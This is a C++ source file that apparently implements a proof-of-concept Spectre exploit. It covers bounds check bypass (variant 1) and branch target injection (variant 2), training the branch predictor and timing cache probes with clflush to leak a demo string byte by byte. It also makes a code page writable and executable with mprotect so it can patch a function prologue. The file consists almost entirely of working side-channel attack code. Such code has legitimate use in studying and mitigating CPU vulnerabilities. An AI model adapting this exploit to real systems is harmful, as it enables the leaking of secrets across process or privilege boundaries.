#include <stdio.h>
#include <stdlib.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include <cstdint>
#include <string.h>
#include <sys/mman.h>
extern "C" {
  uint64_t memory_access(void *target);
  void branch_predictor(uint64_t relative_target,
                        void *basepos,
                        uint64_t *comparer,
                        void *probe_start);
  uint64_t indirect_call(const void *proc,
                     const void *target_memory,
                     const void *probe_start);
  void touch_and_break(uint8_t *target_memory, uint8_t *probe_start);
}

const char TheAnswer[] = "Answer to the Ultimate Question of Life, The Universe, and Everything is 42";
#define probe_lines  256
uint64_t tat[probe_lines];
uint8_t probe[probe_lines * 4096];
uint8_t fake_probe[probe_lines * 4096];
uint8_t *array=NULL;

void bounds_check_bypass(const void *target_address) {
  uint64_t comparer = 1;
  uint8_t gateway[] = {0};

  for (int trial = 0; ; ++trial) {
    for (int i = 0; i < probe_lines; i++)
      _mm_clflush(&probe[i * 4096]);

    uint64_t train_and_attack[12] = {};
    train_and_attack[5]
      = train_and_attack[11]
      = reinterpret_cast<uint64_t>(target_address) - reinterpret_cast<uint64_t>(gateway);

    for (auto x : train_and_attack) {
      _mm_clflush(&comparer);
      branch_predictor(x, gateway, &comparer, probe);
    }

    for (int i = 0; i < probe_lines; i++)
      tat[i] = memory_access(&probe[i * 4096]);

    int idx_min = 1;
    for (int i = 1; i < probe_lines; ++i)
      if (tat[i] < tat[idx_min]) idx_min = i;

    if (tat[idx_min] < 100) {
      printf("trial#%d: guess='%c' (score=%llu)\n", trial, idx_min, tat[idx_min]);
      for (int i = 0; i < probe_lines; ++i) {
        if ((i + 1) % 16 == 0)
          printf("% 6llu\n", tat[i]);
        else
          printf("% 6llu", tat[i]);
      }
      break;
    }
  }
}

void do_nothing(uint8_t*, uint8_t*) {}

void branch_target_injection(const void *target_address) {
  printf("spectre variant2\n");
  uint8_t train_and_attack[6] = {};
  train_and_attack[5] = 1;

  uint8_t original_prologue = *reinterpret_cast<uint8_t*>(touch_and_break);
  void (*target_proc)(uint8_t*, uint8_t*) = nullptr;
  void *call_destination = reinterpret_cast<void*>(&target_proc);
  uint64_t  calltime;
      unsigned int mix_i=0, junk;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

  for (int trial = 0; ; ++trial) {
    // printf("trial #%d\n",trial);
    for (int i = 0; i < probe_lines; i++){
        _mm_clflush(&probe[i * 4096]);
    }

    for (auto x : train_and_attack) {
      target_proc = x ? do_nothing : touch_and_break;
      array = x ? probe : fake_probe;
      calltime=indirect_call(call_destination, target_address, array);
    }
  for (int i = 0; i < probe_lines; i++){
      mix_i = ((i * 167) + 13) & 255;
      tat[mix_i] = memory_access(&probe[mix_i * 4096]);
    }
    int idx_min = 1;
    for (int i = 1; i < probe_lines; ++i)
      if (tat[i] < tat[idx_min]) idx_min = i;
    //printf("%d\n", calltime);
    if (tat[idx_min] < 100) {
      printf("trial#%d: guess='%c' (score=%llu)\n", trial, idx_min, tat[idx_min]);
      //for (int i = 0; i < probe_lines; ++i) {
      //if ((i + 1) % 16 == 0)
      //  printf("% 6llu\n", tat[i]);
      // else
      // printf("% 6llu", tat[i]);
      //}
      break;
    }
  }
}

int JailbreakMemoryPage(void* target) {
    printf("mprotect %llx %llx\n", target, (long long)target & ~(4095));
    int res=mprotect( (void*)((long long)target & ~(4095)),4096,PROT_WRITE|PROT_EXEC);
    printf("mprotect %d\n", res);
  return res;
}

int main(int argc, const char **argv) {
    for(int i=0;i<sizeof(probe);i++)
       probe[i]=i;
    printf("spectre variant2\n");
    if (JailbreakMemoryPage(reinterpret_cast<void*>(touch_and_break) ) != -1) {
        while(1){
            for (int offset = 0; offset < 75; offset ++ ){
                branch_target_injection(TheAnswer + offset);
            }
        }
    }
    return 1;
}
